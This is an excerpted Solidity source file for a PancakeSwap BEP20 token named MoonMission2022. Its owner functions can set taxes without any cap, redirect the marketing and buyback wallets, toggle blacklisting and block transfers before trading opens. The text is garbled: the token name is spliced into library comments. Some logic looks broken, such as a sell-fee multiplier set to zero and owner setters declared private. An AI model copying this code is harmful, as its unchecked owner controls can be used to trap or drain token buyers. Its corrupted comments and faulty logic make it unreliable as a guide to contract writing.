...
abstract contract Context {
	 ...
	 * This allows applications to reconstruct the allowance for all MoonMission2022 just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also MoonMission2022ed.
	...
	// File: contracts/MoonMission2022BEP20PayingToken.sol
	...
	// File: contracts/MoonMission2022.sol

	// 

	pragma solidity ^0.8.0;

	contract MoonMission2022 is ERC20, Ownable {
		using SafeMath for uint256;
        ...
        address payable public marketingWallets = payable(0x10E64Fd43129F914df7E7c63AD9D640F53CDFb48); 
		address payable public buyBackWallets = payable(0x3C8Cfe7D80462bb243F690131Bfbf3d3B3996A49);
		
		uint256 public _maxBuyAmount = 808 * (10**9); 
		uint256 public _maxSellAmount = 404 * (10**9); 
		uint256 public _maxWalletSize = 2022 * (10**9);
		...
		uint256 private gweiLimitBlocksAffected = 4;
		uint256 private gweiLimitBlocksAffectedFeeIncrease = 0;
		...
		event excludeMultipleAccountFromRewards(address[] MoonMission2022, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private _val = 202200 * (10**18); 
		...
		constructor() ERC20("MoonMission2022", "MM22"){
			...
			totalFee = _reflectionFee + _liquidityFee + _marketingFee + _developmentFee;
		...
		function setIsFeeExempt(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "MoonMission2022: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function setIsTxLimitExempt(address account, bool excluded) public onlyOwner {
			require(_isTxLimit[account] != excluded, "MoonMission2022: Account is already the value of 'excluded'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "MoonMission2022: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "MoonMission2022: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "MoonMission2022: The liquidity wallet is already this address");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "MoonMission2022: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "MoonMission2022: Cannot update distributorGas to same value");
		...
		function setWallets(address payable _marketingWallets, address payable _buyBackWallets) external onlyOwner() {
            marketingWallets = _marketingWallets;
			buyBackWallets = _buyBackWallets;

			
		}
		

		function setTxLimit(uint256 maxBuyTx, uint256 maxSellTx, uint256 maxWallet) external onlyOwner() {
            _maxBuyAmount = maxBuyTx * 10**9;
			_maxSellAmount = maxSellTx * 10**9;
        ...
        function setTaxes (uint256 _liquidityFee, uint256 _marketingFee, uint256 _reflectionFee, uint256 _developmentFee, uint256 _feeDenominator) external onlyOwner {
            liquidityFee = _liquidityFee;
            marketingFee = _marketingFee;
            reflectionFee = _reflectionFee;
			developmentFee = _developmentFee;
        ...
        function setProtectionSettings (uint256 _antiBlock, uint256 _antiGas, bool _antiSnipe) external onlyOwner {
            gweiLimitBlocksAffected = _antiBlock;
			gweiLimit = _antiGas * (10 ** 9);
			blacklistMode = _antiSnipe;
		...
		function _transfer(
		   ...
		   if(from != owner()){
			...
			if(!tradingOpen) {
				require(canTransferBeforeswapEnabled[from], "MoonMission2022: This account cannot send tokens until trading is enabled");
			}
			...
			if(takeFee) {
				...
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(gweiLimitBlocksAffectedFeeIncrease).div(100);
				}
